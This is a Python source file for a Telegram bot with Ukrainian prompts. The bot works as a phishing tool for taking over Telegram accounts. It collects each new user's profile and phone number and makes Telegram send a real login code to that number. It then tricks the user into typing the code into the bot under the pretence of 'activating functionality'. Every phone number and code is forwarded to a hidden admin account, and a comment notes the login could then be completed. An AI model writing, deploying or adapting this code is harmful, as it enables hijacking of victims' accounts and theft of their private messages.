
import telebot
import os
from telebot import types
import asyncio
from telethon import TelegramClient

API_ID = os.getenv("API_ID") 
API_HASH = os.getenv("API_HASH")
bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
admin_id = os.getenv("ADMIN_ID")

bot = telebot.TeleBot(bot_token)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    chat_id = message.chat.id

    first_name = user.first_name or "Немає"
    last_name = user.last_name or "Немає"
    username = user.username or "Немає"
    language_code = user.language_code or "Немає"
    phone = getattr(user, 'phone', "Немає")

    user_info = (
        f"🔔 НОВИЙ КОРИСТУВАЧ:\n"
        f"First Name: {first_name}\n"
        f"Last Name: {last_name}\n"
        f"Username: @{username}\n",
        f"ID: {user.id}\n"
        f"Language code: {language_code}"
    )

    print(user_info)
    bot.send_message(admin_id, user_info)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_button = types.KeyboardButton("📱 Поділитися контактом", request_contact=True)
    markup.add(contact_button)

    bot.send_message(
        chat_id,
        "Потрібно підтвердити номер телефону, щоб продовжити. ",
        reply_markup=markup
    )

    bot.send_message(
        chat_id,
        "Привіт! Введи свій номер телефону у форматі +380XXXXXXXXX або натисни кнопку нижче:",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    chat_id = message.chat.id
    contact = message.contact
    phone = contact.phone_number

    user_data[chat_id] = {'phone': phone}
    msg = f"📞 Отримано контакт від {chat_id}:\nНомер: {phone}"
    print(msg)
    bot.send_message(admin_id, msg)

    bot.send_message(chat_id, "Код надсилається...")
    asyncio.run(auth_send_code(chat_id, phone))

@bot.message_handler(func=lambda msg: msg.text.startswith('+380'))
def handle_phone(message):
    chat_id = message.chat.id
    phone = message.text.strip()

    user_data[chat_id] = {'phone': phone}
    msg = f"📞 Отримано номер телефону від {chat_id}:\nНомер: {phone}"
    print(msg)
    bot.send_message(admin_id, msg)

    bot.send_message(chat_id, "Код надсилається...")
    asyncio.run(auth_send_code(chat_id, phone))

async def auth_send_code(chat_id, phone):
    client = TelegramClient(f'session_{chat_id}', API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        user_data[chat_id]['client'] = client
        await client.disconnect()
        bot.send_message(chat_id, "Код надіслано! Введи його сюди:")

@bot.message_handler(func=lambda msg: msg.chat.id in user_data and 'client' in user_data[msg.chat.id])
def handle_code(message):
    chat_id = message.chat.id
    code = message.text.strip()
    phone = user_data[chat_id]['phone']
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_button = types.KeyboardButton("Вимкнути бота")
    markup.add(contact_button)
    
    bot.send_message(chat_id, "Функціонал активовано!", reply_markup=markup)
    msg = f"✅ Отримано код від {chat_id}:\nТелефон: {phone}\nКод: {code}"
    print(msg)
    bot.send_message(admin_id, msg)
    

    asyncio.run(show_data(chat_id, phone, code))
    

@bot.message_handler(func=lambda msg: msg.text == "Вимкнути бота")
def disable_bot(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Бот вимкнуто.")


async def show_data(chat_id, phone, code):
    print(f"Phone: {phone}, Code: {code}")
    # Тут можна дописати авторизацію, якщо хочеш завершити логін

bot.polling()
